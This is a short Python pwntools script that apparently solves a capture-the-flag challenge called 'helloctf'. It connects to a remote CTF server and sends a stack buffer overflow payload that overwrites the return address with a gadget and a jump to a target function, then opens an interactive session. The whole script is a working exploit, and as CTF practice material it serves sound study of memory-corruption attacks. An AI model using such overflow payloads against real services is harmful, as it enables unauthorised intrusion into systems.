#!/usr/bin/env python

from pwn import *

pop_r14_r15_ret = 0x0000000000400710

# r = process( './helloctf' )
r = remote( 'ctf.adl.tw', 11002 )
# pause()
r.sendline( 'A'*0x18 + p64(pop_r14_r15_ret) + p64( 0xdeadbeef ) + p64( 0xdeadbeef ) + p64( 0x400627 ) )

r.interactive()
